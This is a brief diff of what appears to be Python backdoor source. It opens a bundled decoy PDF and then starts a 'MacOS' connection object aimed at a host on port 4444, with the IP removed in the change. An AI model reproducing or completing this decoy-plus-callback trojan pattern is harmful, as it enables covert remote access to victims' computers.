@@ -92,5 +92,5 @@ class MacOS:
 file_name = sys._MEIPASS + "\sample.pdf"
 subprocess.Popen(file_name, shell=True)
 
-door = MacOS("192.168.0.107", 4444)
+door = MacOS("", 4444)
 door.run()
